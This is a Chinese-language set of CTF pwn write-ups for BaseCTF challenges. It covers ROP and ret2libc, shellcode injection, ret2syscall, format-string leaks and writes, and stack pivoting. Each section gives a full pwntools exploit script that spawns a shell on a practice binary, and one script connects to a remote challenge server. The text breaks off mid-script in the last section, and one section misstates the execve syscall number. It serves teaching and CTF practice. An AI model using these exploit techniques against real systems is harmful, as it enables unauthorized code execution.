# Basectf pwn方向“我把她丢了”

by Maple

简单的栈溢出ROP题目，题上已经给了system和/bin/sh的字符串,只需要做一个组合就好。

在64位中，函数的参数是利用寄存器传递的，而第一个参数一般是存放在rdi中的,所以我们先用pop rdi ret把bin/sh字符串地址放在rdi然后再调用system函数即可，调用使用函数的plt表


```

from

pwn

import

*

context
.
terminal

=

'wt.exe -d . wsl.exe -d Ubuntu'
.
split
()

context
(
os
=
'linux'
,

arch
=
'amd64'
,
log_level

=

'debug'
)

p

=

process
(
"./wbtdl"
)

elf

=

ELF
(
'./wbtdl'
)

pop_rdi

=

0x401196

binsh

=

0x402008

ret

=

0x40101a

shell

=

elf
.
plt
[
'system'
]

payload

=

b
'a'
*
0x78
+
p64
(
pop_rdi
)
+
p64
(
binsh
)
+
p64
(
ret
)
+
p64
(
shell
)

p
.
sendline
(
payload
)

p
.
interactive
()

```

这里依次解释一下payload构造的每一项的作用


## pop\_rdi

首先要知道，在x86-64架构下，rdi寄存器用于传递第一个整数或指针参数给函数。而pop\_rdi一般是在堆叠溢出漏洞时用于设置函数调用的第一个参数，在这里pop\_rdi的作用是从栈顶弹出一个值并将其放入rdi寄存器中


## ret

ret指令在这里起到一个“跳板”的作用，确保程序可以按照预期的顺序执行和函数调用，也就是在执行pop\_rdi将binsh的地址弹出到rdi寄存器后，通过ret返回到system函数

不加会怎么样：

如果不使用ret指令，直接在pop\_rdi后面跟system函数的地址，那么在执行完pop\_rdi后，PC会直接跳转到system函数，而不是从栈中弹出返回地址，这会导致system函数的参数传递不正确


## 栈帧分析

`payload = payload = b'a'*0x78+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(shell)`

1. 初始状态的栈状态如下


```

[

...

]

<-

堆栈顶

[

返回地址

]

<-

被溢出覆盖

```

1. 填充120字节的`a`后，覆盖栈上的返回地址


```

[

...

]

<-

堆栈顶

[

0x401196

]

<-

pop_rdi

gadget地址

[

0x402008

]

<-

/
bin
/
sh字符串地址

[

0x40101a

]

<-

ret指令地址

[

0x401050

]

<-

system函数地址

```

1. 执行pop\_rdi gadget后，栈顶弹出binsh地址，并放入rdi寄存器


```

[

...

]

<-

堆栈顶

[

0x40101a

]

<-

ret指令地址

[

0x401050

]

<-

system函数地址

```

1. ret指令被弹出，跳转到该地址执行


```

[

...

]

<-

堆栈顶

[

0x401050

]

<-

system函数地址

```

1. 执行system函数，ret指令从栈中弹出0x401050地址。于是system函数被调用，因为bin/sh的地址存放于rdi中，所以system调用rdi中的地址就是调用了bin/sh，从而执行了bin/sh


## pop\_rdi和ret地址的搜索

在有ROPgadget的情况下可以直接

`ROPgadget --binary <filename> -only "pop|ret"`

例如：


```

linux
>

ROPgadget

--
binary

wbtdl

--
only

"pop|ret"

Gadgets

information

============================================================

0x000000000040117d

:

pop

rbp

;

ret

0x0000000000401196

:

pop

rdi

;

ret

0x000000000040101a

:

ret

Unique

gadgets

found
:

3

```


# Basectf pwn方向“彻底失去她”

by Maple

和“我把她丢了”比较类似，都是ROP简单构造，但是源码中没有bin/sh，需要通过read读取到bss段，再进行调用

需要注意read的三个参数顺序是rdi，rsi，rdx，我们应该依次布置为0，buf,0x10，此时调用read函数就是read(0,buf,0x10)


```

from pwn import *
p = process("./cdsqt")
elf = ELF('./cdsqt')

system = elf.plt['system']
read = elf.plt['read']
pop_rdi = 0x401196
pop_rsi = 0x4011ad
pop_rdx = 0x401265
bss = 0x4040A0

p.recv()

payload = b'a'*(0xa+8)
payload+=p64(pop_rdi)+p64(0)
payload+=p64(pop_rsi)+p64(bss)
payload+=p64(pop_rdx)+p64(0x10)
payload+=p64(read)#read(0,buf,0x10)
payload+=p64(pop_rdi)+p64(bss)+p64(system)

p.sendline(payload)
p.sendline(b'/bin/sh\x00')

p.interactive()

```

解释内容；


## payload = b'a'\*(0xa+8)

填充字节，用于覆盖返回地址之前的内存空间，使其到达返回地址的位置


## payload+=p64(pop\_rdi)+p64(0)

将0弹入rdi寄存器，因为rdi是read函数的第一个参数，表示文件描述符，0代表标准输入


## payload+=p64(pop\_rsi)+p64(bss)

将bss段的地址弹到rsi寄存器，rsi是read函数的第二个参数，表示读取数据的缓冲区地址


## payload+=p64(pop\_rdx)+p64(0x10)

将0x10弹到rdx寄存器，rdx是read函数的第三个参数，表示读取的字节数


## payload+=p64(read)

调用read函数，这个时候read函数被构造为了`read(0,bss,0x10)`,即从标准输入读取0x10个字节的数据到bss段


## payload+=p64(pop\_rdi)+p64(bss)+p64(system)

将bss段的地址弹到rdi寄存器，作为system函数的参数，然后调用system


## 这里为什么没有ret了

建议自己搜索学习一下

提示bss段地址为`0x4040A0`,而“我把她丢了”的字符串bin/sh的地址为`0x402008`


# Basectf pwn方向“shellcode\_level0”

by Maple

题目的提示很明显，就是shellcode，反编译发现直接通过mmap函数输入,权限为7，所以直接注入shellcode就行


```

from

pwn

import

*

p

=

process
(
'./shellcode_level0'
)

p
.
send
(
asm
(
shellcraft
.
sh
()))

p
.
interactive
()

```


## asm(shellcraft.sh())

`shellcraft.sh()`是一个生成shellcode的函数;`asm()`函数将shellcode汇编成机器码。


## mmap()

`mmap()`的函数原型是`void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);`

- **void addr** 指定内存映射区的起始地址。通常设置为NULL,让系统自动选择合适的地址。如果指定地址，需要确保地址对齐，并且有足够的空间
- **size\_t length**:映射区的长度，以字节为单位
- **prot**:指定内存区域的保护属性
- PROT\_READ：区域可读(0x1)
- PROT\_WRITE：区域可写(0x2)
- PROT\_EXEC：区域可执行(0x4)
- PROT\_NONE；区域不可访问
- **flags**:指定映射对象的类型和可见性
- MAP\_PRIVATE：创建一个写入时复制（copy-on-write）的私有映射。对映射区域的修改不会反映到原始文件中。（0x02）
- MAP\_SHARED：创建一个共享映射。对映射区域的修改会反映到原始文件中。(0X01)
- MAP\_ANONYMOUS：创建一个匿名映射，不与任何文件关联（0x20）
- **fd**: 文件描述符，用于指定要映射的文件。如果使用MAP\_ANONYMOUS，则此参数通常设置为-1
- **offset**：文件中的偏移量，指定从文件的哪个位置开始映射。通常需要是页大小的整数倍

这道题的mmap函数调用为`buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL)`

让系统自主选择地址

映射区长度为0x1000uLL（4096字节）

保护属性为7（PROT\_READ | PROT\_WRITE | PROT\_EXEC）：可读可写可执行

flags为34（MAP\_PRIVATE | MAP\_ANONYMOUS）：创建一个私有的匿名映射


## 手写shellcode


```

from

pwn

import

*

p

=

process
(
'./shellcode_level0'
)

shellcode

=

asm
(
'''

    mov rax,0x68732f6e69622f

    push rax

    push rsp

    pop rdi

    push 0x3b

    pop rax

    xor esi, esi

    xor edx, edx

    syscall

'''
)

p
.
send
(
shellcode
)

p
.
interactive
()

```


## 这里为什么是send而不是sendline

其实写sendline也没问题，不会影响这个脚本的运行,如果深究的话，我认为是这些原因

1. 发送的是shellcode：`asm(shellcraft.sh())`生成的是机器码（二进制数据），而不是文本命令。shellcode通常不需要换行符来触发执行，因为它本身就是一段可执行的机器指令
2. 精确控制数据：使用send可以确保发送的数据完全是你生成的shellcode，没有任何额外的字符（如换行符）被添加。这可以确保shellcode正确执行。

*注意，有些题目写send或sendline得到的结果是完全不同的，但后面遇到再说吧*.


# Basectf pwn方向“她与你皆失”

by Maple

`ret2libc`,新手上路的第一块绊脚石，这道题是很标准的两步走，先泄露libc再getshell


```

from

pwn

import

*

context
(
os

=

'linux'
,
arch

=

'amd64'
,
log_level

=

'debug'
)

libc

=

ELF
(
'libc.so.6'
)

p

=

process
(
'./pwn'
)

elf

=

ELF
(
'./pwn'
)

main_addr

=

elf
.
symbols
[
'main'
]

puts_plt

=

elf
.
plt
[
'puts'
]

puts_got

=

elf
.
got
[
'puts'
]

pop_rdi

=

0x401176

ret

=

0x40101a

p
.
recv
()

payload

=

b
'a'
*
(
0xa
+
8
)

payload
+=
p64
(
pop_rdi
)
+
p64
(
puts_got
)
+
p64
(
puts_plt
)
+
p64
(
main_addr
)

p
.
sendline
(
payload
)

puts_addr

=

u64
(
p
.
recvuntil
(
'
\x7f
'
)[
-
6
:]
.
ljust
(
8
,
b
'
\x00
'
))

print
(
hex
(
puts_addr
))

libc_base

=

puts_addr
-
libc
.
sym
[
'puts'
]

print
(
hex
(
libc_base
))

system

=

libc_base
+
libc
.
sym
[
'system'
]

binsh

=

libc_base
+
next
(
libc
.
search
(
b
'/bin/sh'
))

payload2

=

b
'a'
*
(
0xa
+
8
)

payload2
+=
p64
(
pop_rdi
)
+
p64
(
binsh
)
+
p64
(
ret
)
+
p64
(
system
)

p
.
sendline
(
payload2
)

p
.
interactive
()

```


## 加载二进制文件和动态链接库

`libc = ELF('libc.so.6')`这一段是用来加载动态链接库libc.so.6，用于后续获取libc函数的地址

`elf = ELF('./pwn')`用来加载本地的二进制文件，用于获取程序中的地址信息


## 获取地址


```

main_addr

=

elf
.
symbols
[
'main'
]

puts_plt

=

elf
.
plt
[
'puts'
]

puts_got

=

elf
.
got
[
'puts'
]

pop_rdi

=

0x401176

ret

=

0x40101a

```

这里获取了puts函数在PLT(程序链接表)和GOT(全局偏移表)的地址，后面泄露用


## 构造payload1


```

payload

=

b
'a'
*
(
0xa
+
8
)

payload
+=
p64
(
pop_rdi
)
+
p64
(
puts_got
)
+
p64
(
puts_plt
)
+
p64
(
main_addr
)

p
.
sendline
(
payload
)

```

首先溢出覆盖溢出点之前的内存区域，直到返回地址的位置。

接着`pop_rdi`+`puts_GOT`，将puts函数在GOT表中的地址弹入rdi。

通过`puts_plt`调用puts函数，打印出rdi寄存器中此时的值，也就是puts函数在GOT表中的实际位置

泄露完成后，返回main函数，等待下一次payload


## 获取puts的实际地址，并计算libc基址


```

puts_addr

=

u64
(
p
.
recvuntil
(
'
\x7f
'
)[
-
6
:]
.
ljust
(
8
,
b
'
\x00
'
))

print
(
hex
(
puts_addr
))

libc_base

=

puts_addr
-
libc
.
sym
[
'puts'
]

print
(
hex
(
libc_base
))

```

- `u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))`
- `recvuntil('\x7f)`为接收输出直到遇到第一个`\x7f`字节，
- `[-6:]`为取最后6个字节
- `ljust(8,b'\x00')`为将字节串填充到8个字节
- `u64`将字节串转换为64位无符号整数
- `print(hex(puts_addr))`
- 将`puts`函数的真正地址打印出来（其实不加这一步也没事）
- `libc_base = puts_addr-libc.sym['puts']`
- 这里是计算libc库的基地址，因为libc.sym['puts']是`puts`函数在libc中的偏移地址，所以这样可以得到基地址，为后面构造payload2准备


## 构造payload2，getshell


```

system

=

libc_base
+
libc
.
sym
[
'system'
]

binsh

=

libc_base
+
next
(
libc
.
search
(
b
'/bin/sh'
))

payload2

=

b
'a'
*
(
0xa
+
8
)

payload2
+=
p64
(
pop_rdi
)
+
p64
(
binsh
)
+
p64
(
ret
)
+
p64
(
system
)

p
.
sendline
(
payload2
)

p
.
interactive
()

```

- `binsh = libc_base+next(libc.search(b'/bin/sh'))`
- `libc.search(b'/bin/sh')`为一个生成器，用于在libc库中搜索包含/bin/sh字符串的所有地址，而`b'/bin/sh`意为是一个字节串
- `next(libc.search(b'/bin/sh'))`即调用next函数获取生成器的下一个值，简单来说，在这里就是从生成器里获取第一个匹配的地址


## ret2libc原理介绍

我的理解也不是很深刻，如有错误请多多包涵

参考博客：[PLT&GOT](https://www.yuque.com/hxfqg9/bin/ug9gx5#)


### PLT表和GOT表

GOT(Globle offset table)全局偏移量表，位于数据段，是一个每个条目事8字节地址的数组，用来存储外部函数在内存的确切地址

PLT(Procedure linkage table)过程连接表，位于代码段，是一个每个条目事16字节内容的数组，使得代码能够方便的访问共享的函数或者变量

可以一起做一个实验,编写如下源码


```

#include

<stdio.h>

void

print_banner
()

{


printf
(
"Welcome to World of PLT and GOT
\n
"
);

}

int

main
(
void
)

{


print_banner
();


return

0
;

}

```

依次执行编译命令：

`gcc -Wall -g -o test.o -c test.c -m32`

`gcc -o test test.o -m32`

这时我们的测试文件夹中有了test.c、test.o和可执行文件test

通过`objdump -d test.o`查看反汇编

可以看到在`print_banner`中存在`7: e8 fc ff ff ff call 8 <print_banner+0x8>`这样一行

printf()和函数实在glic动态库里面的，只有当程序运行起来的时候才可以确定地址（延迟绑定技术），所以此时的printf（）函数先用fc ff ff ff 也就是有符号的-4来代替

运行时进行重定位时无法修改代码段的，只能将printf重定位到数据段，但是已经编译好的程序，调用printf的时候怎么才能找到这个地址呢？

链接器会额外生成一小段代码，通过这段代码来获取printf()的地址，进行链接的时候只需要对printf\_stub()重定位就可以了


```Plain Text
.text
...

// 调用printf的call指令
call printf\_stub
...
printf\_stub:
mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址
jmp rax // 跳过去执行printf函数

.data
...
printf函数的储存地址,这里储存printf函数重定位后的地址


```

总之，动态链接每个函数需要两个东西：

- 用来存放外部函数地址的数据段
- 用来获取数据段记录的外部函数地址的代码

这里就出现了我们提及的两个表GOT（存放外部函数地址）和PLT（存放额外代码）

可执行文件里面保存的时PLT表对应的地址，对那个PLT地址指向的是GOT的地址，GOT表指向的就是glibc中的地址

那么我们可以发现，在这里面想要通过plt表获取函数的地址，首先要保证got表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux引入了延迟绑定机制


### 延迟绑定

只有动态库函数在被调用时，才会进行地址解析和重定位功能工作，为此可以使用类似这样的代码来实现：


```c
//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址
void printf@plt()
{
address_good:
    jmp *printf@got
lookup_printf:
    //调用重定位函数查找 printf 地址，并写到 printf@got
    goto address_good;//再返回去执行address_good
}

```

这段代码一开始的时候，printf@got是lookup\_printf函数的地址，这个函数的作用是找寻printf()的地址，然后写入printf@got，lookup\_printf执行完成后会返回到address\_good，这样再jmp的话就可以直接跳到printf来执行了

也就是说，如果不知道printf地址，就去找找;如果知道，那就直接jmp去printf

接下来看一下怎么找的

`objdump -d test > test.asm`,在test.asm中可以看到plt表中的三项指令

可以看到后面两个表项中，plt表的第一条都是直接跳转到对应的got表项，而got表项的内容可以gdb查看

*发现不太清楚地址怎么计算出来的话可以先了解一下信息存储*.

之前说过，在还没有执行函数之前，printf@got的内容是lookup\_printf函数的地址，这就是要去找的printf函数的地址了

接下来的是


```

push

$0x0

//将数据压到栈上，作为要执行的函数的参数

jmp

1030

<
_init
+
0x30
>

//去到了第一个表项里

```

继续


```

00001030

<
__libc_start_main
@
plt
-0x10
>:

push

0x4
(
%
ebx
)

//将数据压到栈上，作为后面函数的参数

jmp

*
0x8
(
%
ebx
)

//跳转到函数

add

%
al
,(
%
eax
)

```

再查找下看看jmp去哪了

对应的函数是`_dl_runtime_resolve`


### 小结

在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的

xxx@plt -> xxx@got -> xxx@plt -> 公共@plt -> \_dl\_runtime\_resolve

到这里我们解决最后两个问题;

- dl\_runtime\_resolve 是怎么知道要查找 printf 函数的
- 在xxx@plt中，我们在jmp之前push了一个参数，每个xxx@plt的push的操作数都不一样，那个参数就相当于函数的id，告诉了\_dl\_runtime\_resolve要去找哪一个函数的地址
- 在elf文件中.rel.plt保存了重定位表的信息，使用`readelf -r test`命令可以查看test可执行文件中的重定位信息
- \_dl\_runtime\_resolve找到printf函数地址之后，它怎么知道回填到哪个GOT表项
- 看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址

  在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：
  got [0]: 本 ELF 动态段 （.dynamic 段）的装载地址
  got [1]：本 ELF 的 link\_map 数据结构描述符地址
  got [2]：\_dl\_runtime\_resolve 函数的地址
  动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项


# Basectf pwn方向“shellcode\_level1”

by Maple

根据题目提示，还是shellcode,仔细观察一下先

开启了pie保护和canary保护

read只允许读入两个字节长度，而下面出现了一串很长的看不懂的东西`((void (__fastcall *)(_QWORD, void *, __int64))buf)(0LL, buf, 1280LL);`

我是扔给ai看去了，这么说

总之呢就是一个调用的过程，取决于buf怎么写

所以这一段呢就是，如果mmap函数开辟空间争取却，就会向buf里读入两个字节，然后把buf空间里的内容当作函数执行。

那很自然可以想到，将写shellcode到buf里执行就好了。但是pie保护的开启，导致我们直接找buf地址并写入shellcode不太行

那怎么写入呢，检查一下汇编代码（没思路就去扒扒汇编码）

在`read(0,buf,2ull)`之后，有向寄存器赋值的汇编代码，并且会调用rcx寄存器里面的内容的操作，那是不是可以向rcx里写一个函数，然后如果这个函数的功能是向buf里读取内容，是不是就可以写shellcode进去了。

有这个函数嘛，字长仅两位的话的确没有，但还有另一个函数`syscall`系统调用函数，并且`rax=0`,`rdx=500h`,`rsi=[buf]`，完美符合要求，所以exp就很好构造了


```

from

pwn

import

*

context
.
arch

=

'amd64'

p

=

process
(
'./pwn'
)

p
.
send
(
asm
(
'syscall'
))

p
.
send
(
b
'a'
*
0x2
+
asm
(
shellcraft
.
sh
()))

p
.
interactive
()

```


## syscall

系统调用是操作系统提供给用户程序的一种接口。当用户程序需要操作系统内核的服务时，就会通过系统调用进入内核模式。例如，当一个应用程序需要读取文件内容时，它会发起一个读文件的系统调用。这就好比用户程序是“顾客”，操作系统内核是“服务员”，系统调用就是“点菜”的过程，用户程序告诉内核它需要什么服务。

且`syscall`函数系统调用号的参数所在寄存器为rax，在这里为0，说明其实调用了read函数


## read

`ssize_t read(int fd, void *buf, size_t count);`

- fd：文件描述符，存放寄存器为rdi
- buf:数据化冲区指针（这里mmap已经申请很大一块可读可写可执行的内存了），存放在rsi寄存器中
- count:要读取的字节数：存放在rdx寄存器中

再对照上面的汇编码看看，此时的调用变为了`read(0,buf,0x500)`可以直接写入


# Basectf pwn方向“gift”

by Maple

发现给了很多函数，但是其实没有什么可以用的地方，还开启canary了,但是有可读可写可执行的段，问题不大

因为有很多函数，看看是不是ret2syscall，查一下有没有足够的gaget

*绰绰有余*.

直接`ROPgadget --binary gift --ropchain`一把梭了，反正gets不限长度


```

from

pwn

import

*

from

struct

import

pack

io
=
process
(
'./gift'
)

p

=

b
''

p

+=

pack
(
'<Q'
,

0x0000000000409f9e
)


# pop rsi ; ret

p

+=

pack
(
'<Q'
,

0x00000000004c50e0
)


# @ .data

p

+=

pack
(
'<Q'
,

0x0000000000419484
)


# pop rax ; ret

p

+=

b
'/bin//sh'

p

+=

pack
(
'<Q'
,

0x000000000044a5e5
)


# mov qword ptr [rsi], rax ; ret

p

+=

pack
(
'<Q'
,

0x0000000000409f9e
)


# pop rsi ; ret

p

+=

pack
(
'<Q'
,

0x00000000004c50e8
)


# @ .data + 8

p

+=

pack
(
'<Q'
,

0x000000000043d350
)


# xor rax, rax ; ret

p

+=

pack
(
'<Q'
,

0x000000000044a5e5
)


# mov qword ptr [rsi], rax ; ret

p

+=

pack
(
'<Q'
,

0x0000000000401f2f
)


# pop rdi ; ret

p

+=

pack
(
'<Q'
,

0x00000000004c50e0
)


# @ .data

p

+=

pack
(
'<Q'
,

0x0000000000409f9e
)


# pop rsi ; ret

p

+=

pack
(
'<Q'
,

0x00000000004c50e8
)


# @ .data + 8

p

+=

pack
(
'<Q'
,

0x000000000047f2eb
)


# pop rdx ; pop rbx ; ret

p

+=

pack
(
'<Q'
,

0x00000000004c50e8
)


# @ .data + 8

p

+=

pack
(
'<Q'
,

0x4141414141414141
)


# padding

p

+=

pack
(
'<Q'
,

0x000000000043d350
)


# xor rax, rax ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000471350
)


# add rax, 1 ; ret

p

+=

pack
(
'<Q'
,

0x0000000000401ce4
)


# syscall

payload
=
b
'a'
*
(
0x20
+
8
)
+
p

io
.
recv
()

io
.
sendline
(
payload
)

io
.
interactive
()

```


## 手写

在shellcode1中讲过，rax存放系统调用号，然后将想调用函数的对应参数放入到对应的寄存器里（rdi，rsi，rdx）

ida里并没有发现`/bin.sh`，所以我们应该先构造read函数写入/bin/sh（类似shellcode1），接着调用execve(调用号是8)

1. 寻找目标gaget
2. pop\_rax\_ret = 0x0000000000419484
3. pop\_rdi\_ret = 0x0000000000401f2f
4. pop\_rsi\_ret = 0x0000000000409f9e
5. pop\_rdx\_rbx\_ret = 0x000000000047f2eb
6. syscall = 0x0000000000401ce4
7. payload


```

payload

=

b
'a'
*
0x40

payload

+=

p64
(
rax
)
+
p64
(
0x0
)
+
p64
(
rdi
)
+
p64
(
0
)
+
p64
(
rsi
)
+
p64
(
bss
)
+
p64
(
rdx_rbx
)
+
p64
(
0x10
)
+
p64
(
0x0
)
+
p64
(
syscall
)

payload

+=

p64
(
rax
)
+
p64
(
0x3b
)
+
p64
(
rdi
)
+
p64
(
0x498ac9
)
+
p64
(
rsi
)
+
p64
(
0
)
+
p64
(
rdx_rbx
)
+
p64
(
0
)
+
p64
(
0
)
+
p64
(
syscall
)


```

附：[系统调用表](https://blog.csdn.net/SUKI547/article/details/103315487)


# Basectf pwn方向“string\_format\_level0”

by Maple

题目就是提示，格式化字符串主要的点就是找到偏移量（也可以直接一个个试试，不会太多）


```

from

pwn

import

*

p

=

process
(
'./vuln'
)

payload

=

b
'%8$s'

p
.
sendline
(
payload
)

p
.
interactive
()

```


## 偏移量计算

这里elf先是打开了flag文件，并且把flag的内容read到v6中，此时flag的值就在栈上，所以只要将flag从栈上泄露出来就好，刚好下面就有printf，存在格式化字符串漏洞


```

>./vuln
aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
aaaa 0x7ffe277639f0 0x100 0x7effbc4807e2 0x21001 0x55aedd9902a0 (nil) 0x300000000 0x55aedd9902a0 0x10 0x2070252061616161 0x7025207025207025

```

可以看到我们输入的数据相对于栈的偏移为10，而flag在我们写入数据的上面两行，所以相对于栈的偏移是8

所以其实nc之后%8$s就行（将第8位以%s的格式输出）


# Basectf pwn方向“string\_format\_level1”

by Maple

依旧，题目就是提示，检查下题目发现关闭了PIE保护，也就是说可以在地址上做文章了

这里可以发现当target不为0的时候可以输出flag，所以修改flag值就好


```

from

pwn

import

*

p

=

process
(
'./vuln'
)

target

=

0x4040b0

payload

=

b
'aaa%7$hn'
+
p64
(
target
)

p
.
sendline
(
payload
)

p
.
interactive
()

```


## 解析

获取输入值在栈中的偏移量的方法就不加赘述了

这里target的地址是直接在ida里找到的，因为开启了pie所以所见即所得

`printf("%d %n",a,&b);`的意思是读入数字到a中，而读入的字符数将读入到b指向的内存地址中

`payload = b'aaa%7$hn'+p64(target)`

- 先填充位，不然就算改到target里了也是从0变成了0
- `%7$hn`
- `7$`是第七个参数作为格式化源（也就是printf函数会从堆栈中获取第7个参数的值）
- `hn`表示将该参数的值以半字（half n）（2字节）的形式写入到指定内存
- `p64(target)`就是相应的内存地址

现在的

`printf("%s %hn",aaa,&target)`


# Basectf pwn方向“stack\_in\_stack”

by Maple

栈迁移+libc，我理解的也不是很深刻，就不讲解了，这里附几篇我认为讲的不错的帖子

[栈迁移原理深入理解以及实操](https://xz.aliyun.com/t/12738?time__1311=GqGxu7G%3DGQD%3DoGN4eeqBKwpb8ddY5fII3x)

[栈迁移的原理&&实战运用](https://www.cnblogs.com/ZIKH26/articles/15817337.html)

[栈迁移原理介绍和运用](https://www.cnblogs.com/max1z/p/15299000.html)

[[原创]钉子户的迁徙之路（一）](https://bbs.kanxue.com/thread-281631.htm)


```

from

pwn

import

*

context
(
arch
=
'amd64'
,
os
=
'linux'
,
log_level
=
'debug'
)

#p = process("./pwn")

p

=

remote
(
'gz.imxbt.cn'
,
20330
)

elf

=

ELF
(
"./pwn"
)

libc

=

ELF
(
"./libc.so.6"
)

p
.
recvuntil
(
b
'mick0960.
\n
'
)

buf_addr

=

int
(
p
.
recv
(
14
),
16
)

log
.
info
(
"buf_addr:"
+
hex
(
buf_addr
))

seceret

=

0x4011dd

main

=

0x40124a

leave

=

0x00000000004012f2

ret

=

0x000000000040101a

#泄露libc基地址

payload

=

p64
(
0
)

+

p64
(
seceret
)

+

p64
(
0
)

+

p64
(
main
)

payload

+=

p64
(
0
)

+

p64
(
0
)

#填充到rbp，0x30也就是48个字节减去前面的4*8,再填充两个

payload

+=

p64
(
buf_addr
)

+

p64
(
leave
)
#栈迁移，先覆盖返回地址为buf，再接leave_ret

p
.
send
(
payload
)

p
.
recvuntil
(
b
'0x'
)

libc_base

=

int
(
p
.
recv
(
12
),
16
)
-
libc
.
sym
[
"puts"
]

log
.
info
(
"libc_base:"
+
hex
(
libc_base
))


# 重新接受buf

p
.
recvuntil
(
b
'mick0960.
\n
'
)

buf_addr

=

int
(
p
.
recv
(
14
),
16
)

log
.
info
(
"buf_addr:"
+
hex
(
buf_addr
))

system_addr

=

libc_base
+
libc
.
sym
[
"system"
]

binsh

=

libc_base
+
next
(
libc
.
search
(
b
'/bin/sh'
))

pop_rdi

=

libc_base
+
0x2a3e5

payload

=

p64
(
0
)
+
p64
(
ret
)
+
p64
(
